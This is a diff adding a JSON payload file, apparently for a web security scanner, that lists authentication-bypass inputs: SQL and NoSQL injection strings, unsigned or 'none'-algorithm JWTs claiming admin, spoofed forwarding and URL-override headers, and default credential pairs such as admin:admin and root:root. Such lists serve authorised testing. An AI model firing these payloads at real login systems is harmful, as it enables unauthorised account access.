@@ -1,0 +1,30 @@
+{
+  "vulnerability": "Authentication Bypass",
+  "category": "auth_bypass",
+  "dialects": {
+    "sql_auth": [
+      {"name": "SQL Auth Bypass OR", "type": "sql", "payload": "' OR '1'='1'-- -", "oast": false},
+      {"name": "SQL Auth Bypass Admin", "type": "sql", "payload": "admin'-- -", "oast": false},
+      {"name": "SQL Auth Bypass Double Dash", "type": "sql", "payload": "' OR 1=1-- -", "oast": false},
+      {"name": "NoSQL Injection", "type": "nosql", "payload": "{\"$gt\": \"\"}", "oast": false},
+      {"name": "NoSQL Regex Bypass", "type": "nosql", "payload": "{\"$regex\": \".*\"}", "oast": false}
+    ],
+    "jwt": [
+      {"name": "JWT None Algorithm", "type": "jwt", "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.", "oast": false},
+      {"name": "JWT Empty Signature", "type": "jwt", "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.", "oast": false}
+    ],
+    "header_bypass": [
+      {"name": "X-Forwarded-For Localhost", "type": "header", "payload": "127.0.0.1", "header": "X-Forwarded-For", "oast": false},
+      {"name": "X-Forwarded-Host", "type": "header", "payload": "localhost", "header": "X-Forwarded-Host", "oast": false},
+      {"name": "X-Original-URL Override", "type": "header", "payload": "/admin", "header": "X-Original-URL", "oast": false},
+      {"name": "X-Rewrite-URL Override", "type": "header", "payload": "/admin", "header": "X-Rewrite-URL", "oast": false}
+    ],
+    "default_creds": [
+      {"name": "admin:admin", "type": "credentials", "username": "admin", "password": "admin", "oast": false},
+      {"name": "admin:password", "type": "credentials", "username": "admin", "password": "password", "oast": false},
+      {"name": "root:root", "type": "credentials", "username": "root", "password": "root", "oast": false},
+      {"name": "guest:guest", "type": "credentials", "username": "guest", "password": "guest", "oast": false},
+      {"name": "test:test", "type": "credentials", "username": "test", "password": "test", "oast": false}
+    ]
+  }
+}
